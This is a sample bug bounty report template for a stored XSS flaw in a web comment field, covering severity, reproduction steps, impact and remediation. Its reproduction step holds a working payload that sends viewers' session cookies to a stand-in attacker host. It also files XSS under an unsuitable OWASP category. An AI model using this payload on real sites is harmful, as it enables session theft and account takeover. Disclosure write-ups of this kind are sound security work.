# Stored XSS in Comment Field — Example Report Format

> ⚠️ **This is a sanitized example report** included to demonstrate the writeup format.
> Replace with your real, in-scope engagement results.

| Field | Details |
|---|---|
| **Severity** | High |
| **CVSS** | 7.8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N) |
| **Category** | A07:2021 — Identification & Authentication Failures |
| **Target** | `target.com` (in-scope per program rules) |
| **Status** | Accepted / Fixed |
| **Impact** | Session hijacking of any user viewing the comment |

## Summary
The comment input on the target application does not sanitize user-supplied HTML,
allowing arbitrary JavaScript execution in the context of any viewer's session.

## Steps to Reproduce
1. Log in as a normal user and navigate to `/profile/{id}/comments`.
2. Submit a comment containing:
   ```html
   <img src=x onerror=fetch('//attacker.example/?c='+document.cookie)>
   ```
3. Any user (including admins) viewing the comment triggers the payload.

## Proof of Concept
```http
POST /api/comments HTTP/1.1
Host: target.com

{"body": "<img src=x onerror=...>"}
```
![PoC](../screenshots/poc.png)

## Impact
- Theft of session cookies of any viewer, including admin accounts
- Account takeover and unauthorized access to private data
- Potential defacement or redirection

## Remediation
- HTML-encode all user-supplied content on output (e.g., DOMPurify / framework auto-escaping)
- Set a strict Content-Security-Policy header
- Rotate session tokens on login

## Timeline
| Date | Event |
|---|---|
| 2026-XX-XX | Reported |
| 2026-XX-XX | Triaged (Accepted) |
| 2026-XX-XX | Fixed & verified |
